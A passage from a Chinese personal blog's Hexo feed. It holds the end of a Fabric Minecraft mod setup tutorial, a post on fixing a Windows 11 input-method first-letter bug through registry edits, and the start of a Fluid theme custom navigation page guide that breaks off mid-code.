中找到相关的 <code>fabric-loom</code> 版本说明：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// build.gradle</span><br><span class="line">plugins {</span><br><span class="line">id 'fabric-loom' version "${loom_version}"</span><br><span class="line">id 'maven-publish'</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">//gradle.properties</span><br><span class="line">minecraft_version=1.20.1</span><br><span class="line">yarn_mappings=1.20.1+build.10</span><br><span class="line">loader_version=0.16.14</span><br><span class="line">loom_version=1.11-SNAPSHOT</span><br></pre></td></tr></tbody></table></figure><p>为什么要使用该版本？<a href="https://fabricmc.net/develop/">Fabric 文档</a>是这么写的…</p><blockquote><p>The recommended loom version is <strong>1.11-SNAPSHOT</strong>. This is usually defined near the top of your build.gradle file.<br>推荐的 loom 版本是 1.11-SNAPSHOT。这通常定义在您的 build.gradle 文件顶部附近。</p></blockquote><p>既然使用 Java21 了，相对应的也把 <code>build.gradle</code> 里面的相关配置项也修改为对应的版本：</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">java {</span><br><span class="line">     withSourcesJar()</span><br><span class="line"></span><br><span class="line"><span class="deletion">-    sourceCompatibility = JavaVersion.VERSION_17</span></span><br><span class="line"><span class="deletion">-    targetCompatibility = JavaVersion.VERSION_17</span></span><br><span class="line"><span class="addition">+    sourceCompatibility = JavaVersion.VERSION_21</span></span><br><span class="line"><span class="addition">+    targetCompatibility = JavaVersion.VERSION_21</span></span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"> tasks.withType(JavaCompile).configureEach {</span><br><span class="line"><span class="deletion">-    it.options.release = 17</span></span><br><span class="line"><span class="addition">+    it.options.release = 21</span></span><br><span class="line"> }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>好了。接着，在项目视图的选项中，将平展相关选项和压缩空的中间软件包取消勾选，这将使得 IDEA 不再将 <code>com.frozen.tutorialmod</code> 下的 <code>mixin</code> 文件夹显示为 <code>com.frozen.tutorialmod.mixin</code> 格式，方便我们掌握目录层级情况。<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231810163.png" alt="image-20250723181055120"></p><p>可选，但推荐做的一件事： IDEA 默认使用 Gradle 来构建你的项目，而这在 Fabric 是不必要的，而且会导致构建时间变长以及热交换（hotswapping）相关的种种问题。以下是让 IDEA 使用默认编译器的步骤：</p><ol><li>在 Gradle 页面里打开 “Gradle 设置（Gradle Settings）”</li><li> 将 “使用此工具构建和运行（Build and run using）” 和 “使用此工具运行测试（Run tests using）” 选项改成 “IntelliJ IDEA”。</li></ol><p>不幸的是，目前还不能给 “使用此工具构建和运行” 和 “使用此工具运行测试” 设置一个全 IDE 内的默认值，所以这些每创建一个新项目都得重复上述步骤。</p><h2 id="安装-minecraft-developent-插件"><a class="markdownIt-Anchor" href="#安装-minecraft-developent-插件"></a> 安装 Minecraft Developent 插件</h2><p>如果你使用 IntelliJ IDEA，你可以使用 <a href="https://plugins.jetbrains.com/plugin/8327">MinecraftDev 插件</a>。该插件支持自动生成 Fabric 项目以及一些与 Mixin 有关的功能，如检查、生成访问器（accessor）和影子（shadow）字段、复制 Mixin 目标参考（JVM 描述符）。</p><p>你可以在文件（File） → 设置（Settings） → 插件（Plugins）中打开内部插件浏览器，找到并安装这个插件，只需要在搜索框里搜索 “Minecraft”，选择第一个结果安装即可。</p><h2 id="mod-id"><a class="markdownIt-Anchor" href="#mod-id"></a> Mod ID</h2><blockquote><p>mod 的 id 是该 mod 的唯一标识，且该 id <strong>只能为数字 <code>0-9</code>、小写字母 <code>a-z</code>、下划线<code>_</code>和短横线 <code>-</code> 组成的字符串</strong>，最小长度为 2。</p></blockquote><p>在 <code>java/com/frozen/tutorialmod/TutorialMod.java</code> 中，检查是否已经将 Mod 的 id 进行引入：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TutorialMod</span> <span class="keyword">implements</span> <span class="title class_">ModInitializer</span> {</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">MOD_ID</span> <span class="operator">=</span> <span class="string">"tutorial-mod"</span>; <span class="comment">// 关键语句</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(MOD_ID);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onInitialize</span><span class="params">()</span> {</span><br><span class="line">LOGGER.info(<span class="string">"Hello Fabric world!"</span>);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>此 ID 将在后面的开发过程中多次引用，所以这一步骤十分重要。</strong></p><p>接着，在 <code>resources/fabric.mod.json</code> 文件中，查看 ID 是否正确，相关配置是否正确：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231919281.png" alt="image-20250723191927192"></p><p><code>depends</code> 和 <code>suggests</code> 项，暂不用修改，等以后开发涉及到了视情况修改。</p><h2 id="修改mod版本可选"><a class="markdownIt-Anchor" href="#修改mod版本可选"></a> 修改 mod 版本（可选）</h2><p>我比较喜欢语义化版本控制。由于目前我们只是在配置、初始化阶段，所以在 <code>gradle.properties</code> 中，将 <code>mod_version</code> 进行修改：</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  # Mod Properties</span><br><span class="line"><span class="deletion">- mod_version=1.0.0</span></span><br><span class="line"><span class="addition">+ mod_version=0.0.1-1.20.1</span></span><br><span class="line">  maven_group=com.frozen.tutorialmod</span><br><span class="line">  archives_base_name=tutorial-mod</span><br></pre></td></tr></tbody></table></figure><p>以 <code>0.0.1</code> 为例，这种命名的基本语法是：</p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td><code>MAJOR</code>（主版本）</td><td>有<strong>不兼容性变更</strong>时递增，比如移除 API、重构核心逻辑</td></tr><tr><td><code>MINOR</code>（次版本）</td><td>添加了<strong>新功能</strong>，但向后兼容</td></tr><tr><td><code>PATCH</code>（补丁版本）</td><td>修复了 <strong>bug</strong>，无新增功能，向后兼容</td></tr></tbody></table><p>具体来说：</p><table><thead><tr><th style="text-align:left">版本号</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left"><code>1.2.3</code></td><td style="text-align:left">主版本 1，添加了 2 个次要功能，修复了 3 个 bug</td></tr><tr><td style="text-align:left"><code>0.1.0</code></td><td style="text-align:left">尚在早期开发阶段，有了基本功能</td></tr><tr><td style="text-align:left"><code>0.0.1</code></td><td style="text-align:left">刚起步，甚至还不一定稳定</td></tr><tr><td style="text-align:left"><code>2.0.0</code></td><td style="text-align:left">大版本更新，可能有重大 API 变更或破坏性更改</td></tr></tbody></table><p>对于我的 <code>0.0.1-1.20.1</code> 版本号，<code>-1.20.1</code> 主要是为了声明所兼容的 Minecraft 版本。</p><p>由于我们修改了 <code>gradle.properties</code> 文件，这会影响到构建，所以需要重新加载一遍项目：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507231954961.png" alt="image-20250723195416897"></p><p>这将花费一些时间。</p><h2 id="client初始化"><a class="markdownIt-Anchor" href="#client初始化"></a> Client 初始化</h2><p>前面在模板项目生成的时候，我们取消了勾选拆分客户端和服务器端，这里尝试手动初始化客户端。</p><p>在 <code>resources/fabric.mod.json</code> 中，修改 <code>entrypoints</code> 节点内容：</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> "entrypoints": {</span><br><span class="line">   "main": [</span><br><span class="line">     "com.frozen.tutorialmod.TutorialMod"</span><br><span class="line">   ],</span><br><span class="line"><span class="addition">+  "client": [</span></span><br><span class="line"><span class="addition">+    "com.frozen.tutorialmod.TutorialModClient"</span></span><br><span class="line"><span class="addition">+  ],</span></span><br><span class="line">   "fabric-datagen": [</span><br><span class="line">     "com.frozen.tutorialmod.TutorialModDataGenerator"</span><br><span class="line">   ]</span><br><span class="line"> },</span><br></pre></td></tr></tbody></table></figure><p>根据这项修改，我们就需要在 <code>com.frozen.tutorialmod</code> 文件夹下新建 Java 类 <code>TutorialModClient</code>，刚创建好该文件，代码内容为：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.frozen.tutorialmod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TutorialModClient</span> {</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们将 <code>TutorialModClient</code> 修改为实现 <code>ClientModInitializer</code> 接口的类：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.frozen.tutorialmod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.fabricmc.api.ClientModInitializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TutorialModClient</span> <span class="keyword">implements</span> <span class="title class_">ClientModInitializer</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onInitializeClient</span><span class="params">()</span> {</span><br><span class="line">      </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>onInitializeClient()</code> 方法暂时不需要做任何事。</p><h2 id="生成minecraft源码"><a class="markdownIt-Anchor" href="#生成minecraft源码"></a> 生成 Minecraft 源码</h2><p>Minecraft 的源码对我们的开发有着很高的参考价值，这将帮助我们理解各种写法。</p><h3 id="检查java_home版本"><a class="markdownIt-Anchor" href="#检查java_home版本"></a> 检查 JAVA_HOME 版本</h3><p>请确认自己的 <code>JAVA_HOME</code> 的值指向的是 <code>Java21</code> 而非其他版本。</p><p>Gradle 启动的时候 <strong>默认使用自己找到的 JDK</strong>。如果系统上现在有 <strong>多个 JDK 安装</strong>，Gradle 会优先使用以下路径之一来选择 JDK：</p><ol><li>环境变量 <code>JAVA_HOME</code>（<strong>优先级最高</strong>）</li><li><code>gradle.properties</code> 中指定的 <code>org.gradle.java.home</code></li><li>系统 PATH 中的 Java 版本（最后才使用）</li></ol><p>对我来说，我的 <code>JAVA_HOME</code> 环境变量设为了 <code>%JAVA_HOME21%</code>，这将和我的 <code>JAVA_HOME17</code>、<code>JAVA_HOME21</code> 等 <code>JAVA_HOMExx</code> 格式的环境变量进行配合，一般来说，终端将会输出：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS E:\Coding\Fabric\tutorial-mod-template-1.20.1&gt; <span class="built_in">echo</span> <span class="variable">$env</span>:JAVA_HOME</span><br><span class="line">E:\Program Files\jdk-21.0.7</span><br><span class="line">PS E:\Coding\Fabric\tutorial-mod-template-1.20.1&gt; java -version</span><br><span class="line">java version <span class="string">"21.0.7"</span> 2025-04-15 LTS</span><br><span class="line">Java(TM) SE Runtime Environment (build 21.0.7+8-LTS-245)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 21.0.7+8-LTS-245, mixed mode, sharing)</span><br><span class="line">PS E:\Coding\Fabric\tutorial-mod-template-1.20.1&gt;</span><br></pre></td></tr></tbody></table></figure><p>这是正常的输出。</p><p>但如果，你的 <code>JAVA_HOME</code> 环境变量设置的是 <code>%JAVA_HOME17%</code>，<strong>只是将 IDEA 中的相关配置为了 Java21</strong> 的话，那么可能在终端中执行 <code>gradle</code> 相关命令，例如：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\gradlew -v</span><br></pre></td></tr></tbody></table></figure><p>此时读取到的还是 17，而执行 <code>java -version</code> 却能正确输出为 java21 版本，这十分诡异对吧？</p><p>实际上，<code>$env:JAVA_HOME</code> 和 <code>java -version</code> 读取的项是<strong>不一样</strong>的。这一点很容易搞混，尤其是初学者。具体来说：</p><ol><li><code>$env:JAVA_HOME</code>：读取的是环境变量 <code>JAVA_HOME</code> 的值，如果是 <code>%JAVA_HOME21%</code> 那么就会得到 <code>JAVA21</code></li><li><code>java -version</code>：读取的是环境变量 <code>PATH</code> 的值，<code>java</code> 命令会从 <code>PATH</code> 中按照先后顺序找到一个 <code>java</code> 有效目录，用以执行命令。</li></ol><p>这与 IDEA 设置中设置的 Java21 是不相关的：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232056342.png" alt="image-20250723205656287"></p><p>如果你确实是上面的诡异情况，请在更改 <code>JAVA_HOME</code> 指向的值之后，重启 IDEA 再另起一个终端窗口。</p><h3 id="生成源码"><a class="markdownIt-Anchor" href="#生成源码"></a> 生成源码</h3><p>唤起终端窗口（默认唤起的是 PowerShell），执行下面的命令：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew genSources</span><br></pre></td></tr></tbody></table></figure><p>下载成功将输出：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> E:\Coding\Fabric\tutorial<span class="literal">-mod-template-1</span>.<span class="number">20.1</span>&gt; ./gradlew genSources</span><br><span class="line">Starting a Gradle Daemon, <span class="number">4</span> stopped Daemons could not be reused, use <span class="literal">--status</span> <span class="keyword">for</span> details</span><br><span class="line"></span><br><span class="line">&gt; Configure project :</span><br><span class="line">Fabric Loom: <span class="number">1.11</span>.<span class="number">4</span></span><br><span class="line"></span><br><span class="line">&gt; Task :genSourcesWithVineflower</span><br><span class="line">Decompile cache stats: <span class="number">0</span> hits, <span class="number">4786</span> misses</span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL <span class="keyword">in</span> <span class="number">42</span>s</span><br><span class="line"><span class="number">1</span> actionable task: <span class="number">1</span> executed</span><br><span class="line"><span class="built_in">PS</span> E:\Coding\Fabric\tutorial<span class="literal">-mod-template-1</span>.<span class="number">20.1</span>&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="如何查看源码"><a class="markdownIt-Anchor" href="#如何查看源码"></a> 如何查看源码</h3><p>在 <code>java/com/frozen/tutorialmod/mixin/ExampleMixin.java</code> 文件中，将鼠标选中 <code>MinecraftServer</code> 并按下鼠标中键：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mixin(MinecraftServer.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleMixin</span> {</span><br><span class="line"><span class="meta">@Inject(at = @At("HEAD"), method = "loadWorld")</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(CallbackInfo info)</span> {</span><br><span class="line"><span class="comment">// This code is injected into the start of MinecraftServer.loadWorld()V</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这将跳转至我们刚才下载的 Minecraft 源码，如下图所示：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232136079.png" alt="image-20250723213650992"></p><p>注意，打开的应该是带注释的源码！如果你的 IDEA 版本和我不同，可能打开的是默认的 IDEA 帮你反编译之后的代码，你需要手动选择代码上方的蓝条的 <code>Choose Sources</code> 也就是选择源：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232143275.png" alt="image-20250723214304170"></p><p>如果选择源之后，代码上方的蓝条变成了红条，这也是正常的。</p><h2 id="运行minecraft测试"><a class="markdownIt-Anchor" href="#运行minecraft测试"></a> 运行 Minecraft 测试</h2><p>现在，我们就可以尝试运行一次 Minecraft 来测试我们的一切配置、代码是否正确了。<br>找到 Gradle 栏，选择 <code>Tasks/fabric/runClient</code>，如下图所示：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232147538.png" alt="image-20250723214701481"></p><p>不出意外出来 Minecraft 的窗口之后，我们创建一个存档，进入存档试试功能：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232149661.png" alt="image-20250723214902547"></p><p>只要在控制台中的日志没有什么 error 错误就行。</p><h2 id="git版本控制"><a class="markdownIt-Anchor" href="#git版本控制"></a> Git 版本控制</h2><p>我十分推荐对项目进行版本控制，这里使用的是 GitHub。<br>注册账号就不讲了，自己搜索就行。由于我们已经在使用 IDEA，那么直接用 IDEA 的版本控制选项就行（旧版本可能叫 VCS）：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232210705.png" alt="image-20250723221011632"></p><p>IDEA 将会弹出一个对话框，让你填相关信息：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232212822.png" alt="image-20250723221203767"></p><p>仓库私有与否，顾名思义，私有别人就看不到，如果你想和别人协作或者有别的考虑就可以公开。<br>接着进行第一次提交：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507232215286.png" alt="image-20250723221513229"></p><p>确认文件无误就可以提交并推送了（如果只是提交，则是只提交到了本地仓库而 GitHub 是没有的）。此后，每次对相关文件的更改都将进行记录。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fabric </tag>
            
            <tag> Minecraft </tag>
            
            <tag> Modding </tag>
            
            <tag> 模组开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Bug】Windows11 23-24h2 输入首个字母变成英文无法打出汉字</title>
      <link href="/posts/18029.html"/>
      <url>/posts/18029.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>Microsoft 官方社区已有临时解决办法，详见：<a href="https://answers.microsoft.com/zh-hans/windows/forum/windows_11-wintop_language/windows11/85892fa6-cda9-467b-a633-b5ab6f1f098e">Windows11 24H2 开启触摸键盘功能后，会导致输入法首字母不被自定义输入法接管（变为英文）[内附解决方案]</a></p></blockquote><p>本文在此简单总结，权当记录这个困扰我半年的问题的临时解决办法。</p><h2 id="问题现象"><a class="markdownIt-Anchor" href="#问题现象"></a> 问题现象</h2><p>此 Bug 触发时，你打字 <code>你好</code> 则会变成 <code>n几号</code> 之类的。大伙讨论后暂且认为是 Windows 在启动触摸键盘后，Ctrl+C 复制任意内容，再直接用第三方输入法输入，就出现首字母无法识别的情况。问题出现时如下图：</p><p><img src="https://filestore.community.support.microsoft.com/api/images/eecf0be1-5bc4-4a31-8079-baab80f410fc?upload=true&amp;fud_access=hC1SxZhn7m%2FZQJkOIiOVstu10yTQgXS4A%2FDBzZTg8nbaCgIogkrcDydMeI5Y4za2dOqDdWtsG2JNS3E35V60i9TiGHR7STMpJHheeXuDvO8nwjUlqCBHhJ0NDvuYN7OSRRp9bmvjnhEISMadqToCfqKLVN9hlZDhkHR415ZMhl1NswjCQADON1C9TuNlqvXekgExslMTgQ53ybvVsiTJ8EMtmz%2B2oOJhm%2F5O%2BImoRmWeIu6RoUaf9HTQ9ekycnU%2B2Mf%2FuVlIjRKtBfLcBTOKYLQh8%2BfS9ngej2s792YsDst%2FcU43ft25ax%2F3WNkYlBmbLzCgNtRtf%2BJHuIcVA0XGgrS7z5O9kTYOVyDlO5GAW1X6R97WQbKc8ttb7cOY93Es94M%2BE2pdso0RgvOM6%2FGssJVGa9RIjxeVUcsY7%2F5Jgk4%3D" alt="Bug复现"></p><h2 id="复现方法"><a class="markdownIt-Anchor" href="#复现方法"></a> 复现方法</h2><p>哔哩哔哩上已有具体视频凭借 Windows 沙盒复现，详见：<a href="https://www.bilibili.com/video/BV1xKJNzWESz">Windows 首字母不纳入输入法 bug 的完整复现方法</a></p><h2 id="23h2-临时解决方法"><a class="markdownIt-Anchor" href="#23h2-临时解决方法"></a> 23H2 临时解决方法</h2><p>Win+R 输入 <code>regedit</code> 打开注册表，找到：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算机\HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\Common</span><br></pre></td></tr></tbody></table></figure><p>在右侧找到 <code>TouchKeyboardHasEverShown</code>，双击或右键修改它，将其改为 <code>0</code>，保存后注销或重启：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050149883.png" alt=""></p><p>此后只要不打开触摸键盘便可正常使用，如果不小心打开了，再次修改这个条目为 <code>0</code></p><h3 id="可选的一劳永逸方案"><a class="markdownIt-Anchor" href="#可选的一劳永逸方案"></a> 可选的一劳永逸方案</h3><p>如果有时确实要用到触摸键盘或者一劳永逸解决问题，可以将该项的权限锁定，以避免被更改。</p><div class="note warning flat"><p>⚠️<strong>注意</strong>：</p><p>修改权限可能导致未知问题，如非必要不建议修改。</p></div><p>操作如下图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050152671.png" alt=""></p><p>在上图的第 4 步鼠标左键点击选择主体之后，需要在第 5 步的输入框内手动输入 <strong>Everyone</strong> 然后点击<strong>确定</strong>。</p><p>在第 6 步点击确定之后，将会出现下图的对话框，按下图操作：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050157972.png" alt=""></p><p>依次选择类型<strong>拒绝</strong>，应用于<strong>只有该项</strong>并点击<strong>显示高级权限</strong>，我们只勾选设置数值即可：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050158482.png" alt=""></p><p>这之后，回到最开始的添加权限对话窗口，如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050159561.png" alt=""></p><p>接着<strong>注销或者直接重启</strong>，此后打开触摸键盘后出现 bug，无需其他操作，再次注销或者重启即可解决。</p><h3 id="另一个方案监视该注册表项"><a class="markdownIt-Anchor" href="#另一个方案监视该注册表项"></a> 另一个方案：监视该注册表项</h3><p>如我上面所说，修改权限可能会导致未知问题出现。我自己的选择是使用火绒安全这个软件对该注册表项进行监视。</p><blockquote><p>火绒版本：6.0.6.3</p></blockquote><p>防护中心 =&gt; 系统防护 =&gt; 开启自定义防护，如下图：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050205756.png" alt=""></p><p>在接下来的对话窗口中添加自定义规则：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050206133.png" alt=""></p><p>添加保护对象即可，我们无需选择程序来针对某个程序：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050207743.png" alt=""></p><p>这里第 2 步的处理方式看个人喜好，我选择当触发规则时，优先询问我。</p><p>接着重新定位到该注册表项即可，触发保护的动作看个人喜好，我这里不限制读取，其他行为均触发规则：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506050210917.png" alt=""></p><p>保存之后重启电脑即可。</p><h2 id="24h2-临时解决方法"><a class="markdownIt-Anchor" href="#24h2-临时解决方法"></a> 24H2 临时解决方法</h2><p>24H2 同样找到 23H2 的注册表地址：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\InputMethod\Settings\Common</span><br></pre></td></tr></tbody></table></figure><p>将 <code>Common</code> 中的所有项全部删除，可右键 <code>Common</code> 选择导出留存备份。</p><p>注销或重启电脑。若再次出现同样 Bug，按照上述方法再次修改注册表即可。如果你也时不时会用到触摸键盘或者想一劳永逸，解决办法和 23H2 一致。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows11 </tag>
            
            <tag> Bug </tag>
            
            <tag> 非预期输入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fluid 创建自定义导航页</title>
      <link href="/posts/8736.html"/>
      <url>/posts/8736.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="为什么要这样做"><a class="markdownIt-Anchor" href="#为什么要这样做"></a> 为什么要这样做？</h2><p>有时为了快速找到收藏的网站，直接把他们放在博客上也是一个好选择。例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505151541449.png" alt=""></p><h2 id="创建自定义页面"><a class="markdownIt-Anchor" href="#创建自定义页面"></a> 创建自定义页面</h2><p>在 fluid 主题文档中，明确指出了该如何创建自定义页面，详见：<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/#%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2">自定义页面</a></p><h2 id="创建ejs文件"><a class="markdownIt-Anchor" href="#创建ejs文件"></a> 创建 ejs 文件</h2><p>在按照文档创建好自定义页面之后，会自动生成 <code>index.md</code> 文件。阅读 fluid 文档可以知道，文章页拥有一个属性 <code>layout</code>，可以快速渲染 md 文档为各种样式的页面。</p><p>经过观察可以知道，友情链接页面和上面说的这种导航页面十分接近，故以友情链接的模板进行修改便能快速得到想要的渲染模板。</p><p>友情链接的渲染模板 <code>links.ejs</code>l 在 <code>Blog\node_modules\hexo-theme-fluid\layout</code> 目录下，将其复制一份改为 <code>collections.ejs</code> 于同目录下，文件内容如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">page.<span class="property">layout</span> = <span class="string">"collections"</span></span><br><span class="line">page.<span class="property">title</span> = theme.<span class="property">collections</span>.<span class="property">title</span> || <span class="title function_">__</span>(<span class="string">'collections.title'</span>)</span><br><span class="line">page.<span class="property">subtitle</span> = theme.<span class="property">collections</span>.<span class="property">subtitle</span> || <span class="title function_">__</span>(<span class="string">'collections.subtitle'</span>)</span><br><span class="line">page.<span class="property">banner_img</span> = theme.<span class="property">collections</span>.<span class="property">banner_img</span></span><br><span class="line">page.<span class="property">banner_img_height</span> = theme.<span class="property">collections</span>.<span 